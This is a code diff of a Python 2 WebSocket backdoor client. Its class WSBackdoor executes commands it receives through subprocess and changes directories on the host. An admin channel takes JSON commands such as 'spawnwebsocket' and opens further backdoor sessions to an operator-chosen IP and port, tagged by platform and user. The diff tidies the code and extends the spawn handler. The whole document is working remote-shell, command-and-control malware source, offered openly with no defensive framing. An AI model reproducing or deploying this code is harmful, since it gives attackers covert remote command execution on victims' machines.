@@ -4,7 +4,7 @@ from ws4py.client.threadedclient import WebSocketClient
 import subprocess
 import optparse
 import os
-from clint.packages.colorama.win32 import STDERR
+#from clint.packages.colorama.win32 import STDERR
 import json
 import platform
 
@@ -16,8 +16,9 @@ ip = ''
 port = ''
 listeners = []
 
+
 class WSBackdoor(WebSocketClient):
-    
+
     def __execute__(self, cmd, args=None):
             try:
                 proc = subprocess.Popen(cmd, shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
@@ -26,7 +27,7 @@ class WSBackdoor(WebSocketClient):
                 stdout = str(err)
                 print stdout
             return stdout
-    
+
     def changeDir(self, args):
         path = os.path.abspath(args)
         if os.path.exists(path) and os.path.isdir(path):
@@ -34,7 +35,7 @@ class WSBackdoor(WebSocketClient):
             return True
         else:
             return False
-    
+
     def opened(self):
         self.send("Hello Server! - From Shell Runner Client\n")
 
@@ -55,12 +56,11 @@ class WSBackdoor(WebSocketClient):
 
 
 class AdminWebsocket(WebSocketClient):
-    
-    def __ObjectHandler__(self,jsonObject):
-        
-        pass
-    
-    
+    listeners = []
+    '''Websocket Manager'''
+    def addListeners(self, webSocket):
+            self.listeners.append(webSocket)
+
     def opened(self):
         self.send("Hello Server! - From Client Admin Websockets\n")
 
@@ -69,22 +69,18 @@ class AdminWebsocket(WebSocketClient):
 
     def received_message(self, jsonObject):
         print 'RECEIVED ON ADMIN INTERFACE:\n\n %s' % str(jsonObject)
-        #Delete this bit
-        ''''jsonObject = str(jsonObject)
-        decoded = json.loads(jsonObject)
-        print 'JSON OBJECT TYPE: ', type(decoded[0])
-        jsonDict = decoded[0]
-        '''
-        processor = jsonObjectProccessor();
+        processor = jsonObjectProccessor()
         processor.processObject(jsonObject)
+
 
 class jsonObjectProccessor():
     '''Process Json Command Objects'''
-    def __spawnHandler__(self):
+    def __spawnHandler__(self, jsonDict):
         print 'Made it to Spawnhandler! - Reminder CLEAN THIS SHIT UP!'
         group = str(platform.system())
         print 'Detected Platform: %s' % group
-        ws = WSBackdoor('http://'+ip+':'+port+'/endpoint/boxes/box1', protocols=['http-only', 'chat'])
+        print 'json user: %s' % jsonDict['user']
+        ws = WSBackdoor('http://' + ip + ':' + port + '/endpoint/' + group + '/' + UUID + '/' + jsonDict['user'], protocols=['http-only', 'chat'])
         ws.connect()
         listeners.append(ws)
 
@@ -96,12 +92,12 @@ class jsonObjectProccessor():
         print 'Command Dictionary: ', jsonDict
         print 'Command: %s' % jsonDict['command']
         if jsonDict['command'] == 'spawnwebsocket':
-            self.__spawnHandler__()
+            self.__spawnHandler__(jsonDict)
 
 if __name__ == '__main__':
     usage = __doc__
     author = __author__
-    version= "0.01"
+    version = "0.01"
     parser = optparse.OptionParser(usage, None, optparse.Option, version)
     parser.add_option('-p',
                       '--port',
@@ -117,7 +113,7 @@ if __name__ == '__main__':
     ip = options.ip
     port = options.port
     try:
-        adminWebsocket = AdminWebsocket('http://'+options.ip+':'+options.port+'/endpoint/admin/6faf6300-7318-11e1-b0c4-0800200c9a66/', protocols=['http-only', 'chat'])
+        adminWebsocket = AdminWebsocket('http://' + options.ip + ':' + options.port + '/endpoint/admin/6faf6300-7318-11e1-b0c4-0800200c9a66/', protocols=['http-only', 'chat'])
         adminWebsocket.connect()
     except KeyboardInterrupt:
         for socket in listeners:
